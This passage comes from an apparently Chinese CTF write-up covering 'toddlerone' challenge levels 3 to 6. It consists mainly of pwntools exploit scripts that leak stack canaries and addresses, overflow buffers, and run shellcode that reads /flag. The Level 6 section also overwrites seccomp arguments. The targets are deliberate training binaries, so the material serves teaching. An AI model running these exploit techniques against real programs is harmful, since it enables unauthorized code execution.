class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/toddlerone_level3.0&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/toddlerone_level3.0&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;REPEAT&#x27;</span>.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;REPEAT&#x27;</span>.ljust(<span class="hljs-number">0x19</span>,<span class="hljs-string">b&#x27;b&#x27;</span>))<br>ru(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x13</span>)<br>canary = uu64(<span class="hljs-string">b&#x27;\x00&#x27;</span>+rc(<span class="hljs-number">7</span>))<br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+p64(<span class="hljs-number">0xdeadbeef</span>)+p64(stack_addr-<span class="hljs-number">0x1110</span>)+asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>,canary)<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L4-L4-1-v2"><a class="header-anchor" href="#L4-L4-1-v2">Â¶</a>L4,L4.1</h2><p>ret2shellcodeï¼ŒåŠ äº†è‡ªå·±ç±»ä¼¼ canary çš„ä¸œè¥¿ï¼Œå¡ä¸€ä¸‹å°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/toddlerone_level4.1&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/toddlerone_level4.1&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><br><span class="hljs-comment"># sla(&quot;Payload size:&quot;,&#x27;&#123;&#125;&#x27;.format(1024))</span><br><span class="hljs-comment"># # sea(&quot;Send your payload&quot;,&#x27;e&#x27;)</span><br><span class="hljs-comment"># sea(&quot;Send your payload&quot;,b&#x27;REPEAT&#x27;.ljust(0x69,b&#x27;a&#x27;))</span><br><span class="hljs-comment"># ru(&#x27;a&#x27;*(0x69-len(&#x27;REPEAT&#x27;)))</span><br><span class="hljs-comment"># canary = uu64(b&#x27;\x00&#x27;+rc(7))</span><br><span class="hljs-comment"># stack_addr = uu64(ru(&#x27;\x7f&#x27;,drop=False)[-6:])</span><br><span class="hljs-comment"># lg(&#x27;stack_addr&#x27;,stack_addr)</span><br><span class="hljs-comment"># sla(&quot;Payload size:&quot;,&#x27;&#123;&#125;&#x27;.format(1024))</span><br><span class="hljs-comment"># # stack_addr = uu64(ru(&#x27;\x7f&#x27;,drop=False)[-6:])</span><br><span class="hljs-comment"># # sla(&quot;Payload size:&quot;,&#x27;&#123;&#125;&#x27;.format(1024))</span><br><span class="hljs-comment"># # sea(&quot;Send your payload&quot;,&#x27;REPEAT&#x27;.ljust(0x19,b&#x27;b&#x27;))</span><br><br><span class="hljs-comment"># sea(&quot;Send your payload&quot;,b&#x27;a&#x27;*0x60+p64(0x91B08AA50A05917C)+p64(canary)+p64(0xdeadbeef)+p64(stack_addr-0x10f0)+asm(shellcraft.cat(&#x27;/flag&#x27;)))</span><br><span class="hljs-comment"># lg(&#x27;canary&#x27;,canary)</span><br><span class="hljs-comment"># lg(&#x27;stack_addr&#x27;,stack_addr)</span><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br><br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;REPEAT&#x27;</span>.ljust(<span class="hljs-number">0x69</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>ru(<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x69</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;REPEAT&#x27;</span>)))<br>canary = uu64(<span class="hljs-string">b&#x27;\x00&#x27;</span>+rc(<span class="hljs-number">7</span>))<br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br><br><br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x33968C4126228809</span>)*<span class="hljs-number">2</span>+p64(canary)+p64(<span class="hljs-number">0xdeadbeef</span>)+p64(stack_addr-<span class="hljs-number">0x10f0</span>)+asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>,canary)<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L5-L5-1-v2"><a class="header-anchor" href="#L5-L5-1-v2">Â¶</a>L5,L5.1</h2><p>åŒä¸Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/toddlerone_level5.0&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/toddlerone_level5.0&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;REPEAT&#x27;</span>.ljust(<span class="hljs-number">0x79</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>ru(<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x79</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;REPEAT&#x27;</span>)))<br>canary = uu64(<span class="hljs-string">b&#x27;\x00&#x27;</span>+rc(<span class="hljs-number">7</span>))<br><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;REPEAT&#x27;</span>.ljust(<span class="hljs-number">0x78</span>+<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0x0AA68ECF246D765BE</span>)+p64(canary)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0xdeadbeef</span>)+p64(stack_addr-<span class="hljs-number">0x1d0</span>)+asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>,canary)<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/toddlerone_level5.1&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/toddlerone_level5.1&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;REPEAT&#x27;</span>.ljust(<span class="hljs-number">0x49</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>ru(<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x49</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;REPEAT&#x27;</span>)))<br>canary = uu64(<span class="hljs-string">b&#x27;\x00&#x27;</span>+rc(<span class="hljs-number">7</span>))<br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,p64(<span class="hljs-number">0xDA9F6AB399DA6AF9</span>)*(<span class="hljs-number">0x48</span>//<span class="hljs-number">8</span>)+p64(canary)+p64(<span class="hljs-number">0xdeadbeef</span>)+p64(stack_addr-<span class="hljs-number">0x10e0</span>)+asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L6-L6-1-v2"><a class="header-anchor" href="#L6-L6-1-v2">Â¶</a>L6,L6.1</h2><p>seccomp çš„å‚æ•°æ˜¯ä»æ ˆä¸Šå–çš„ï¼Œæˆ‘ä»¬è‡ªå·±å¯ä»¥è¦†ç›–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, 